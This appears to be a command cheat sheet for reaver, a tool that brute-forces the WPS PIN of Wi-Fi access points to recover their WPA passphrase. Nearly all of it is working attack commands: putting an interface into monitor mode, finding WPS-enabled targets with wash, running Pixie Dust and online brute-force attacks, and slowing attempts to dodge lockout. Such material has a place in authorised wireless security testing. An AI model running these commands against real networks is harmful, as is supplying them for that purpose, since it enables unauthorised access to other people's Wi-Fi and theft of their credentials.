# reaver — WPS PIN brute force

> **Attacks the WPS Registrar PIN.** If WPS is enabled and the PIN is weak, recovers WPA passphrase without cracking a handshake.

**Install check:** `reaver --help`

---

## 🎯 Cheat-flow

```bash
# 1. Monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# 2. Find WPS-enabled APs
sudo wash -i wlan0mon

# 3. Brute force one
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vvv
```

On success reaver prints:
```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecret123'
[+] AP SSID: 'TargetNet'
```

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-i <iface>` | Monitor interface |
| `-b <BSSID>` | Target AP |
| `-c <ch>` | Channel |
| `-e <ESSID>` | SSID |
| `-vv` / `-vvv` | Verbose |
| `-K 1` | Try **Pixie Dust** offline attack (fast wins) |
| `-L` | Ignore locked state |
| `-N` | Don't send NACK packets |
| `-d <sec>` | Delay between attempts |
| `-T <sec>` | M5/M7 timeout |
| `-r <N:M>` | Sleep M seconds every N attempts |
| `-S` | Small DH keys (faster) |
| `-p <pin>` | Start with a specific PIN |
| `-s <file>` | Session file (resume) |

---

## 📋 Recipes

```bash
# 1. Pixie Dust (offline) — try first, takes seconds if vulnerable
sudo reaver -i wlan0mon -b <BSSID> -c <ch> -K 1 -vvv

# 2. Standard online brute
sudo reaver -i wlan0mon -b <BSSID> -c <ch> -vv

# 3. Slow & stealthy to avoid lockout
sudo reaver -i wlan0mon -b <BSSID> -c <ch> -d 30 -T 0.5 -r 3:15

# 4. Resume after interruption
sudo reaver -i wlan0mon -b <BSSID> -c <ch> -s /etc/reaver/<BSSID>.wpc
```

---

## ⚠️ Gotchas

- **Modern APs lock out WPS** after a few failed attempts. Watch for `WARNING: Detected AP rate limiting`.
- **Pixie Dust** (`-K 1`) works only on vulnerable chipsets (Broadcom, Ralink, Realtek) — always try first, takes seconds.
- Run [wash](wash.md) to confirm WPS is active + not locked (`Lck` column).
- Card must support injection + monitor mode.
- Full brute force can take hours — PIN space is ~11,000 thanks to the design flaw.

---

## 🔗 Related

- [wash](wash.md) · [wifite](wifite.md) · [airodump-ng](airodump-ng.md) · [aircrack-ng](aircrack-ng.md)
